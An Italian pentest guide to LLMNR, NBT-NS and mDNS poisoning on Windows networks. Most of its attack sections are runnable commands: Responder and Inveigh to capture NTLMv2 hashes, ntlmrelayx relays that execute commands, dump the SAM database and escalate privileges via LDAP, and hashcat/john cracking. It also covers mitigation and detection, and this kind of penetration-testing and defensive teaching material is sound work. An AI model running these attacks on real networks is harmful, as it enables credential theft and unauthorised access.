# Windows Name Resolution Attacks

## Scopo

Questa guida copre le vulnerabilità legate alla risoluzione dei nomi in ambienti Windows, inclusi LLMNR, NBT-NS e mDNS poisoning. Questi protocolli legacy possono essere sfruttati per intercettare credenziali e eseguire attacchi relay.

## Prerequisiti

- Kali Linux o distribuzione con tool di pentesting
- Responder, Inveigh o tool simili
- Accesso alla rete target
- **Autorizzazione scritta** per i test
- Conoscenza di protocolli Windows networking

## Installazione

```bash
# Responder (su Kali, preinstallato)
sudo apt-get install responder

# Inveigh (PowerShell)
Import-Module .\Inveigh.ps1
```

---

## Protocolli Vulnerabili

### LLMNR (Link-Local Multicast Name Resolution)

- **Porta**: UDP 5355
- **Multicast**: 224.0.0.252
- Usato quando DNS fallisce
- Presente in Windows Vista e successivi

### NBT-NS (NetBIOS Name Service)

- **Porta**: UDP 137
- Protocollo legacy NetBIOS
- Broadcast sulla rete locale
- Presente in tutte le versioni Windows

### mDNS (Multicast DNS)

- **Porta**: UDP 5353
- **Multicast**: 224.0.0.251
- Usato per discovery servizi
- Cross-platform

---

## Attacco con Responder

### Configurazione

```ini
# /etc/responder/Responder.conf

[Responder Core]
; Servizi da abilitare
SQL = On
SMB = On
HTTP = On
HTTPS = On
LDAP = On
FTP = On

; Poisoning
LLMNR = On
NBT-NS = On
mDNS = On
```

### Avvio Responder

```bash
# Avvio base
sudo responder -I eth0

# Con analisi passiva (no poisoning)
sudo responder -I eth0 -A

# Con WPAD rogue
sudo responder -I eth0 -wF

# Verbose mode
sudo responder -I eth0 -v
```

### Output Esempio

```
[+] Listening for events...
[*] [NBT-NS] Poisoned answer sent to 192.168.1.50 for name FILESERVER (service: File Server)
[*] [LLMNR] Poisoned answer sent to 192.168.1.50 for name FILESERVER
[SMB] NTLMv2-SSP Client   : 192.168.1.50
[SMB] NTLMv2-SSP Username : DOMAIN\john.doe
[SMB] NTLMv2-SSP Hash     : john.doe::DOMAIN:abc123...
```

### Log e Hash

```bash
# Location hash catturati
/usr/share/responder/logs/

# Formato file
SMB-NTLMv2-SSP-192.168.1.50.txt
HTTP-NTLMv2-192.168.1.50.txt
```

---

## Attacco con Inveigh (PowerShell)

```powershell
# Import modulo
Import-Module .\Inveigh.ps1

# Avvio base
Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y

# Con HTTP capture
Invoke-Inveigh -LLMNR Y -NBNS Y -HTTP Y -ConsoleOutput Y

# Salva output
Invoke-Inveigh -LLMNR Y -NBNS Y -FileOutput Y

# Visualizza hash catturati
Get-Inveigh -NTLMv2

# Stop
Stop-Inveigh
```

---

## Relay Attacks

### SMB Relay con ntlmrelayx

```bash
# Prepara lista target (SMB signing disabled)
crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt

# Avvia relay
sudo ntlmrelayx.py -tf targets.txt -smb2support

# Con esecuzione comando
sudo ntlmrelayx.py -tf targets.txt -c "whoami" -smb2support

# Dump SAM
sudo ntlmrelayx.py -tf targets.txt --sam -smb2support
```

### LDAP Relay

```bash
# Relay a LDAP per privilege escalation
sudo ntlmrelayx.py -t ldap://dc.domain.com --escalate-user victim
```

### Combinazione Responder + Relay

```bash
# Terminal 1: Responder in modalità relay
sudo responder -I eth0 --disable-ess

# Modifica Responder.conf
SMB = Off
HTTP = Off

# Terminal 2: ntlmrelayx
sudo ntlmrelayx.py -tf targets.txt -smb2support
```

---

## Cracking Hash NTLMv2

```bash
# Con hashcat
hashcat -m 5600 hashes.txt wordlist.txt

# Con john
john --format=netntlmv2 hashes.txt --wordlist=wordlist.txt

# Formato hash
username::domain:challenge:response:blob
```

---

## Mitigazioni

### Disabilitare LLMNR

```powershell
# Via Group Policy
# Computer Configuration > Administrative Templates > Network > DNS Client
# "Turn off multicast name resolution" = Enabled

# Via Registry
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name "EnableMulticast" -Value 0
```

### Disabilitare NBT-NS

```powershell
# Via Network Adapter
# Proprietà > IPv4 > Avanzate > WINS > Disable NetBIOS over TCP/IP

# Via DHCP Option 001
# Disable NetBIOS over TCP/IP
```

### SMB Signing

```powershell
# Abilita SMB Signing (obbligatorio)
Set-SmbServerConfiguration -RequireSecuritySignature $true

# Via GPO
# Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options
# "Microsoft network server: Digitally sign communications (always)" = Enabled
```

### Network Segmentation

- Separa VLAN per reparti
- Limita broadcast domain
- Implementa 802.1X

---

## Detection

### Event Log

```
Event ID 4648: Logon specifying alternate credentials
Event ID 4624: Successful logon
Event ID 4625: Failed logon
```

### Network Monitoring

```bash
# Traffico LLMNR sospetto
tcpdump -i eth0 udp port 5355

# Traffico NBT-NS
tcpdump -i eth0 udp port 137
```

### Honeypot

```bash
# Usa Responder in analysis mode come honeypot
sudo responder -I eth0 -A
# Monitora tentativi di poisoning
```

---

## Best Practices

- **Disable legacy protocols**: Disabilita LLMNR e NBT-NS dove possibile
- **SMB Signing**: Abilita e richiedi SMB signing
- **Network segmentation**: Limita broadcast domain
- **Monitoring**: Monitora traffico multicast sospetto
- **EPA**: Implementa Extended Protection for Authentication
- **Strong passwords**: Password complesse resistono al cracking

## Riferimenti

- [Responder GitHub](https://github.com/lgandx/Responder)
- [Inveigh GitHub](https://github.com/Kevin-Robertson/Inveigh)
- [Microsoft LLMNR](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831519(v=ws.11))
- [MITRE ATT&CK - LLMNR/NBT-NS Poisoning](https://attack.mitre.org/techniques/T1557/001/)
